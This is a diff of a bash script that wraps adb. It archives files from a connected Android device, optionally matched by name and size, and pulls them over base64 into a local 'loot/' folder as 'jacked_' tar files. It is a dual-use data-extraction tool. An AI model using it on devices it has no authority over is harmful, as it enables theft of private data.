@@ -48,11 +48,6 @@ else
 	exit
 fi
 
-# Let's just push busybox, because screw making stock roms compatible
-# (This will bite me in the ass when we get any non-ARM6/7 arch. proc.)
-ourBBPath=/data/local/tmp/busybox
-adb push includes/busybox-static $ourBBPath
-
 # ADB wrapper to easy root pain...
 command(){
 	echo "$*" > $TMP/p2p-tmp 
@@ -118,7 +113,7 @@ isRoot(){
 
 # Check the size of a directory or more
 dataSize(){
-	command "du -hc $*" | tail -n1
+	command "/data/local/tmp/busybox du -hc $*" | tail -n1
 }
 
 
@@ -140,8 +135,10 @@ getData(){
 # Actually get the file
 getDataProto(){
 	FILENAME=jacked_$(date +%s).tar
-	command "tar -cf - $* 2>/dev/null | ${ourBBPath} base64 " | tr -d "\r" |  base64 -d > $FILENAME
-	echo "The file has been saved as $FILENAME"
+	SAUCEDIR=loot/
+	mkdir $SAUCEDIR 2>/dev/null
+	command "/data/local/tmp/busybox tar -cf - $* 2>/dev/null | /data/local/tmp/busybox base64 " | tr -d "\r" |  base64 -d > ${SAUCEDIR}/$FILENAME
+	echo "The file has been saved as ${SAUCEDIR}/${FILENAME}"
 }
 
 
@@ -173,16 +170,16 @@ getSearch(){
 # Actually get the file
 getSearchProto(){
 	FILENAME=jacked_$(date +%s).tar
-	command "${ourBBPath} find $1 -iname '$2' -type f -size $3 -exec tar -cf - {} \; 2>/dev/null | base64 " | tr -d "\r" | base64 -d > $FILENAME
+	command "/data/local/tmp/busybox find $1 -iname '$2' -type f -size $3 -exec tar -cf - {} \; 2>/dev/null | base64 " | tr -d "\r" | base64 -d > $FILENAME
 	echo "The file has been saved as $FILENAME"
 }
 
 search(){
-	command "${ourBBPath} find $1 -iname '$2' -type f -size $3 -exec ls {} \;"
+	command "/data/local/tmp/busybox find $1 -iname '$2' -type f -size $3 -exec ls {} \;"
 }
 
 size(){
-	command "${ourBBPath} find $1 -iname \"$2\" -type f -size $3 -print0 | xargs -0 du -ch|tail -n1"
+	command "/data/local/tmp/busybox find $1 -iname \"$2\" -type f -size $3 -print0 | /data/local/tmp/busybox xargs -0 /data/local/tmp/busybox du -ch|tail -n1"
 }
 
 
